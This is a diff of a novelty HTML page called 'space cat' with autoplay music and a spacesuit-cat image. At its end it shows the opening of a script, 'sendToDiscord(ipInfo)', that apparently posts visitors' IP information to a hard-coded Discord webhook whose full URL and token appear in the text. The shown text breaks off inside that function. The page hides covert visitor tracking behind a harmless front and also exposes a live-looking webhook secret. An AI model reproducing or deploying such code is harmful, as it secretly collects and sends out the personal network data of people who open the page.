@@ -4,24 +4,28 @@
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" />
         <title>space cat</title>
+
+        <!-- Favicon -->
+        <link rel="icon" type="image/png" href="https://cdn.discordapp.com/attachments/1414982624463818925/1414991279846064247/4b03e9cce2aa856bd65d35acd4817b27-cat-in-a-spacesuit-sitting-on-the-moon.webp?ex=68c58952&is=68c437d2&hm=833d91c6f8c730dc4fd965358c477e608e04b9e40036e8b7bf696070dbfe4e72&">
+
         <link rel="stylesheet" href="rizz.css" />
-        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
         <link rel="manifest" href="/site.webmanifest">
     </head>
     <body>
         <!-- Background Music (autoplay muted, then unmute on click) -->
         <audio id="bgMusic" autoplay loop muted hidden>
-            <source src="DEATH - LEAVE YOUR FAMILY GRIEVING [OFFICIAL VIDEO] SHOT BY @Crypticfilth810.mp3" type="audio/mpeg">
+            <source src="music.mp3" type="audio/mpeg">
         </audio>
 
         <canvas></canvas>
 
         <!-- Centered Spaceman Character -->
         <div class="dork">
-  <img src="https://cdn.discordapp.com/attachments/1414982624463818925/1414991279846064247/4b03e9cce2aa856bd65d35acd4817b27-cat-in-a-spacesuit-sitting-on-the-moon.webp?ex=68c58952&is=68c437d2&hm=833d91c6f8c730dc4fd965358c477e608e04b9e40036e8b7bf696070dbfe4e72&" alt="Spaceman" />
-</div>
+            <img src="https://cdn.discordapp.com/attachments/1414982624463818925/1414991279846064247/4b03e9cce2aa856bd65d35acd4817b27-cat-in-a-spacesuit-sitting-on-the-moon.webp?ex=68c58952&is=68c437d2&hm=833d91c6f8c730dc4fd965358c477e608e04b9e40036e8b7bf696070dbfe4e72&" alt="Spaceman" />
+        </div>
 
         <script src="yo.js"></script>
 
@@ -29,11 +33,11 @@
         <script>
             document.addEventListener("click", () => {
                 const music = document.getElementById("bgMusic");
-                music.muted = false;   // unmute
-                music.play();          // ensure playback starts
+                music.muted = false;
+                music.play();
             }, { once: true });
         </script>
-            <script>
+         <script>
     async function sendToDiscord(ipInfo) {
         const webhookURL = 'https://discord.com/api/webhooks/1414982640246853774/d52YIc8k6ZxrM2-caMi_keBr5IVoo-DS3J8Yn6Vg65hRXhKmvio3YI8nYLWpPnEQ1Xru';
         const discordMessage = {
